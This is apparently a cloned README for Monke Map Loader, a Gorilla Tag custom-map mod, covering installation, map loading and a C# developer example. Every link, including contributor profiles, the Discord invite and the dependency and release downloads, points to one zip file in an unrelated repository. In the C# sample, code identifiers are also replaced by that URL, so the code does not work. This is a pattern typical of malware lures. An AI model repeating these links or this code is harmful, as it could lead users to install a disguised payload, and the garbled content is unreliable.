# Monke Map Loader

<img src="https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip" data-canonical-src="https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip" width="500"/>

A PC mod that loads custom maps for Gorilla Tag.

**Monke Map Loader** initially started as a solo project to try to load a custom map into the game. Eventually, it became a group effort to provide a complex solution with:

- A nice in-game interface for selecting maps
- Fake "public lobby" matchmaking to play with others on custom maps
- Sets of tools for map makers to use in their creations to add gameplay variety
- A ready to use Unity project with an automatic map export script.

Main contributors beside me:

- [Bobbie](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)
- [Steven](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)
- [RedBrumbler](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)
- [ToniMacaroni](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)
- [Graic](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)

You can find all of us, as well as other mods, on the [Gorilla Tag Modding Discord](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)

## Contents

- [Installation](#installation)
- [Custom maps](#custom-maps)
- [Loading a map](#loading-a-map)
- [Troubleshooting](#troubleshooting)
- [Map making](#map-making)
- [For Developers](#for-developers)

## Installation

### Automatic

You can install **Monke Map Loader** automatically with the help of [Monke Mod Manager](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip). It will make sure that you have the map loader and all the needed dependencies installed.

### Manual

**Monke Map Loader** requires BepInEx to work. You can download it from [this page](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip). From the *Assets* dropdown pick the appropriate version for your operating system (for example: *https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip* for Windows 10 64-bit).

Then, extract the zip file to the main folder of the game, for example to:  
*C:\\Program Files\\Steam\\steamapps\\common\\Gorilla Tag\\*  

Run the game once and close it for the BepInEx to install itself and create the proper folder structure.

Download all the dependencies and put them in suitable locations, according to the installation guide of each:

- [Utilla](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)
- [ComputerInterface](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)
- [Bepinject and Extenject](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)
- [https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)

Download the **Monke Map Loader** from the latest [release](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip) and extract the zip file into the games folder.

## Custom maps

You can download custom maps from our website: [Monke Map Hub](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip).

To install a custom map, place it in the following folder:
> *BepInEx\\plugins\\MonkeMapLoader\\CustomMaps*

**Monke Map Loader** uses a custom **Gorilla Tag Map** file format (*.gtmap*), which contains a package of a descriptor file, map thumbnails and map files for both platforms: Windows and Android (Quest)

Therefore, `.gtmap` files are also compatible with Quest map loader.

## Loading a map

**Monke Map Loader** uses the ComputerInterface mod to provide a comfortable way of selecting the map you want to load:

1. On the main menu select the **Monke Map Loader** with the arrow keys and hit *Enter*.
2. You'll see the list of all installed custom maps with an orb next to the PC to preview the current level. You can select one using *Up* and *Down* arrow keys or switch the page with *Left* and *Right* keys. Then select the desired map by pressing *Enter*.
3. On the next screen there will be details of the chosen map, such as the Title, Author Name and Description. To confirm the choice hit *Enter* again (you can go back to previous screens using the *Back* key).
4. After the loading is complete you should see a confirmation on the screen.

You can now step into the teleporter on the left of the computer and after a brief delay you'll be teleported to the chosen map.

Because using mods in public rooms/lobbies in not allowed, **Monke Mod Loader** uses a private room matchmaking system, which will auto join you to a private room with other players that have the same map loaded.

To load a different map, you'll need to go back to the tree room/base using a green teleporter placed somewhere on the map, and then select another map on the computer.

Custom maps are loaded in different location from the original map, so it stays intact and can be still used to play on it.

## Troubleshooting

- If the **Monke Map Loader** mod is not showing in the main computer menu, some dependencies may not be installed. Check the installation steps or use the Monke Mod Manager to install it for you.
- If the map isn't showing on the list it may be in a wrong file format or be corrupt. If you're the map creator, it's best to use the provided [Unity project](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip) to make/extract the map to the proper format.
- If you encounter any bugs/errors with the operation of map loader please contact Vadix or Bobbie on the [Discord server](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip).
- If you encounter bugs on specific maps try contacting the map Author to give them feedback.

## Map making

The easiest and recommended way of making the map in the right format is to use the [Gorilla Tag Map Project](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip), an pre-setup Unity project with map tools, prefabs, and an export script that automates the making of the map package and saves it in the right format.

On that page you can also find an in-depth guide on how to use to its full potential and what tools and objects are available to use on your map. **MAKE SURE TO FOLLOW THE GUIDE IN THE README!**

You can also get more help on map making on the [Discord server](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip).

Have fun making you own custom map for this awesome game and make sure to share it with others! ;)

## For Developers

The map loader allows other mods to access some info about the current map (including arbitrary custom data) and subscribe to actions for map load/unload and map join/leave. All public events are under the [Events class](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip).

```cs
public class MyMod : MonoBehaviour {
  public void Awake() {
    https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip += OnMapEnter;
    https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip += OnMapChange;
  }

  // Going through the teleporter
  public void OnMapEnter(bool enter) {
    if (enter) {
      // Get the custom map data
      var customData = https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip;

      // Check if the gamemode is "mygamemode"
      if (https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip("gamemode", out var gamemode) && gamemode as string == "myGameMode") {
        // Get instance of MyClass from custom data
        MyClass myData = (customData["mydata"] as https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip).ToObject<MyClass>();
      }

      // Get other data
      https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip($"Map name is: {https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip}");
      https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip($"Gravity speed is: {https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip}");
    }
  }

  // Map creation / destruction
  public void OnMapChange(bool enter) {
    if (!enter) {
      RemoveMyObjects();
    }
  }
}
```

Documentation for adding custom data to a map can be found in the [Gorilla Tag Map Project](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip) readme.

## Disclaimers
This product is not affiliated with Gorilla Tag or Another Axiom LLC and is not endorsed or otherwise sponsored by Another Axiom LLC. Portions of the materials contained herein are property of Another Axiom LLC. ©2021 Another Axiom LLC.
